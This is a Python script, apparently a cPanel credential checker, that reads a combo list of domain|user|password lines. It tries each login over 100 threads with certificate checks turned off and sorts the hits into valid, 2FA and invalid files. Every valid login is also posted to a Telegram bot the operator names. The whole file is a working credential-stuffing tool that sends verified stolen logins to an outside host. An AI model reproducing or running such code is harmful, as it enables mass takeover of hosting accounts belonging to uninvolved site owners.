import os
import sys
import concurrent.futures
import requests
import threading
import urllib3
import chardet
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

lock = threading.Lock()

def ensure_dir(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

ensure_dir('Results')

# Telegram gönderim fonksiyonu
def send_to_telegram(token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": message}
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"Telegram gönderim hatası: {e}")

def cpcheck(url):
    try:
        domain, username, pwd = url.split("|")
        host = domain + "/login/?login_only=1"
        host = host.replace("http://", "https://").replace(":2082", ":2083")
        log = {'user': username, 'pass': pwd}
        
        req = requests.post(host, data=log, timeout=15, verify=False)

        if 'twofactor' in req.text.lower() or '2fa' in req.text.lower() or 'authentication required' in req.text.lower():
            with lock:
                print(f"🅰️ [2FA] {url}")
                with open('Results/2fa.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
        elif 'security_token' in req.text and 'twofactor' not in req.text.lower():
            with lock:
                print(f"✅ [VALID] {url}")
                with open('Results/valid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
                send_to_telegram(BOT_TOKEN, CHAT_ID, f"[VALID] {url}")
        else:
            with lock:
                print(f"❌ [INVALID] {url}")
                with open('Results/invalid.txt', 'a', encoding='utf-8') as f:
                    f.write(url + "\n")
    except Exception as e:
        with lock:
            print(f"⚠️ [ERROR] {url} -> {e}")
            with open('Results/invalid.txt', 'a', encoding='utf-8') as f:
                f.write(url + "\n")
    time.sleep(0.3)

def detect_encoding(file_path):
    with open(file_path, 'rb') as f:
        raw_data = f.read(100000)
    result = chardet.detect(raw_data)
    return result['encoding']

def menu():
    global BOT_TOKEN, CHAT_ID

    # Kullanıcıdan Telegram bilgileri al
    BOT_TOKEN = input("Telegram Bot Token: ").strip()
    CHAT_ID = input("Telegram Chat ID: ").strip()

    try:
        file_path = input("cPanel list file name (example: combos.txt): ").strip()
        encoding = detect_encoding(file_path)
        print(f"File encoding: {encoding}")
        
        with open(file_path, 'rt', encoding=encoding, errors='ignore') as f:  
            url_list = f.read().splitlines()

        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(cpcheck, url_list)
    except Exception as e:
        print(f"Error occurred: {e}")

if __name__ == '__main__':
    try:
        menu()
    except KeyboardInterrupt:
        sys.exit(0)
